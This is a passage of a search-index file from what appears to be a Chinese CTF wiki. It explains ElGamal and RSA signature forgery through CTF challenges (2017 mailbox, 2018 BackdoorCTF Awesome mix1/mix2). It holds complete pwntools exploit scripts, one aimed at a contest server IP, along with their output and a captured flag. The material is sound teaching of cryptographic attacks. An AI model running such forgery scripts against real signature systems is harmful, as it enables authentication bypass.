y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p \u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5 g^{si} \\equiv g^m \\bmod p-1 g^{si} \\equiv g^m \\bmod p-1 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/elgamal/#_11","text":"\u53c2\u8003pdf\u3002","title":"\u5df2\u77e5\u7b7e\u540d\u4f2a\u9020"},{"location":"crypto/signature/elgamal/#_12","text":"","title":"\u9009\u62e9\u7b7e\u540d\u4f2a\u9020"},{"location":"crypto/signature/elgamal/#_13","text":"\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/signature/elgamal/#_14","text":"\u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606fm\u2018\u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/signature/elgamal/#_15","text":"\u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c i\u6625\u79cb\u6709\u590d\u73b0 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work proof = b64 . b64encode ( os . urandom ( 12 )) req . sendall ( \"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %d bytes, starting with %s \\n \" % ( len ( proof ) + 5 , proof )) test = req . recv ( 21 ) ha = hashlib . sha1 () ha . update ( test ) if ( test [ 0 : 16 ] != proof or ord ( ha . digest ()[ - 1 ]) != 0 or ord ( ha . digest ()[ - 2 ]) != 0 ): # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0): req . sendall ( \"Check failed\" ) req . close () return \u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002 \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002 def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002 \u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002 \u7ee7\u7eed\u5206\u6790 if len ( msg ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return if msg [: 4 ] == \"test\" : r , s = sign ( digitalize ( msg ), sk , pk , p , g ) req . sendall ( \"Your signature is\" + repr (( hex ( r ), hex ( s ))) + \" \\n \" ) else : if msg == \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test : req . sendall ( \"Signature:\" ) sig = self . rfile . readline () . strip () if len ( sig ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return sig_rs = sig . split ( \",\" ) if len ( sig_rs ) < 2 : req . sendall ( \"yo what?\" ) req . close () return # print \"Got sig\", sig_rs if verify ( digitalize ( msg ), int ( sig_rs [ 0 ]), int ( sig_rs [ 1 ]), pk , p , g ): req . sendall ( \"Login Success. \\n Dr. Ziegler has a message for you: \" + FLAG ) print \"shipped flag\" req . close () return else : req . sendall ( \"You are not the Genji I knew! \\n \" ) \u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053 \u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002 \u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002 \u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002 \u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 \u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002 \u5177\u4f53\u5982\u4e0b # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) \u6700\u540e\u7684\u811a\u672c\u5982\u4e0b from pwn import * from hashlib import sha1 import string import ast import os import binascii context . log_level = 'debug' def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' def digitalize ( m ): return int ( m . encode ( 'hex' ), 16 ) sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) sh . recvuntil ( 'Current PK we are using: ' ) pubkey = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) p = pubkey [ 0 ] g = pubkey [ 1 ] pk = pubkey [ 2 ] # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) assert ( victim % ( p - 1 ) == digitalize ( target ) % ( p - 1 )) # get victim signature sh . sendline ( hex ( victim )[ 2 :] . decode ( 'hex' )) sh . recvuntil ( 'Your signature is' ) sig = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) sig = [ int ( sig [ 0 ], 0 ), int ( sig [ 1 ], 0 )] # get flag sh . sendline ( target ) sh . sendline ( str ( sig [ 0 ]) + \",\" + str ( sig [ 1 ])) sh . interactive () \u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002 python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/signature/introduction/","text":"\u6570\u5b57\u7b7e\u540d \u00b6 \u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002 \u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b","title":"\u6570\u5b57\u7b7e\u540d\u7b80\u4ecb"},{"location":"crypto/signature/introduction/#_1","text":"\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002 \u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b","title":"\u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/","text":"RSA \u6570\u5b57\u7b7e\u540d \u00b6 \u539f\u7406 \u00b6 \u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002 2018 Backdoor Awesome mix1 \u00b6 \u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 from Util import PKCS1_pad as pad def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) \u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa n,e \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 e=1 \u7684\u8bdd\uff0c\u90a3\u4e48 h(m)-pad(m)=kn h(m)-pad(m)=kn \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./mix1.py \u3002 exp \u5982\u4e0b from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6548\u679c\u5982\u4e0b \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive 2018 Backdoor Awesome mix2 \u00b6 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./service.py \u3002 \u9898\u76ee\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u9898\u76ee\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e e \u6709\u7ea6\u675f\uff0c\u5fc5\u987b\u5927\u4e8e 3\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 1 \u4e86\u3002 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u5269\u4e0b\u7684\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020 n \u4e3a\u7d20\u6570\uff0c\u4f7f\u5f97 n-1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 pohlig_hellman \u7b97\u6cd5\u4e86\u3002 from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 < minnum : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m def log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], M ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], M ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** pe bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f \u7531\u4e8e g^x=y g^x=y \u4e2d\u7684 g \u548c y \u90fd\u662f\u7ed9\u5b9a\u7684\uff0c\u6211\u4eec\u65b0\u627e\u5230\u7684 n\uff0c\u4e0d\u4e00\u5b9a g \u7684\u5e42\u6b21\u6784\u6210\u7684\u7fa4\u4f1a\u5305\u542b y\uff0c\u6240\u4ee5\u53ef\u80fd\u6c42\u89e3\u5931\u8d25\uff0c\u6240\u4ee5\u9700\u8981\u591a\u6b21\u6c42\u89e3\u3002 \u6e90\u4ee3\u7801\u4e2d\u867d\u7136 n.bit_length() <= 1025 \uff0c\u4f46\u662f\u5176\u5b9e n \u5728\u6ee1\u8db3\u4e0d\u5c0f\u4e8e signature \u7684\u6761\u4ef6\u65f6\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff08pycrypto \u6e90\u7801\uff09 modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) != k : return 0 \u6240\u4ee5\u6211\u4eec\u6700\u597d\u8bbe\u7f6e n \u4e3a1024 \u6bd4\u7279\u4f4d\u3002","title":"RSA \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/#rsa","text":"","title":"RSA \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/#_1","text":"\u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix1","text":"\u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 